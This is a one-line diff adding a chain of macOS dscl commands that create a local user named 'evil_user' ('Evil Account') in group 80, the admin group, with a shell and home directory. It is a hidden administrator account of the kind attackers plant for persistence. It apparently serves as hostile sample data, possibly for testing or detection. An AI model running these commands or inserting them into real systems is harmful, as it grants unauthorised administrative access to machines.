@@ -1,0 +1,1 @@
+dscl . -create /Users/evil_user; dscl . -create /Users/evil_user UserShell /bin/zsh; dscl . -create /Users/evil_user RealName "Evil Account"; dscl . -create /Users/evil_user UniqueID "1010"; dscl . -create /Users/evil_user PrimaryGroupID 80; dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user
